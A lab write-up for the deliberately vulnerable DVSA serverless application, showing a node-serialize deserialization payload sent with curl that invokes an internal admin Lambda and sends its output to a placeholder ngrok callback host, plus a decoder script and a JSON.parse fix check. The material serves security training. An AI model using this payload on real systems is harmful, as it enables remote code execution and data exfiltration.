# Lesson 03 - Sensitive Information Disclosure

> This lesson reused the controlled Lesson 01 code-execution path to invoke an internal admin receipt function in the DVSA lab. Replace callback and API placeholders. Do not commit real tokens, callback URLs, or downloaded private archives.

## Environment

```bash
export API="https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order"
export CALLBACK="https://<your-ngrok-or-test-callback>/lol"
```

## Start callback listener

```bash
ngrok http 8080
```

Ngrok inspection UI:

```text
http://127.0.0.1:4040
```

## Controlled internal-function invocation payload

The report used the same `_$$ND_FUNC$$_` entry point and invoked `DVSA-ADMIN-GET-RECEIPT` with a lab month/year.

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  --data '{"action":"_$$ND_FUNC$$_function(){const {LambdaClient,InvokeCommand}=require(\"@aws-sdk/client-lambda\");const lambda=new LambdaClient({});const p={FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",InvocationType:\"RequestResponse\",Payload:JSON.stringify({\"year\":\"2018\",\"month\":\"12\"})};lambda.send(new InvokeCommand(p)).then(function(d){require(\"https\").get(\"https://<your-callback>/lol?data=\"+encodeURIComponent(JSON.stringify(d)));});}()"}'
```

## Decode captured callback data

Save the `data=` value from the callback request into `encoded.txt`, then decode it:

```bash
python3 - <<'PY'
import json, urllib.parse
from pathlib import Path

raw = Path('encoded.txt').read_text().strip()
outer = json.loads(urllib.parse.unquote(raw))
payload = outer.get('Payload')

if isinstance(payload, dict) and 'data' in payload:
    payload = bytes(payload['data']).decode('utf-8', errors='replace')
elif isinstance(payload, list):
    payload = bytes(payload).decode('utf-8', errors='replace')
elif isinstance(payload, str):
    payload = payload

print(payload)
PY
```

## Fix verification

After replacing unsafe deserialization with `JSON.parse()`, repeat the same request. Expected result:

```text
No new ngrok callback.
No signed S3 receipt URL is produced.
```
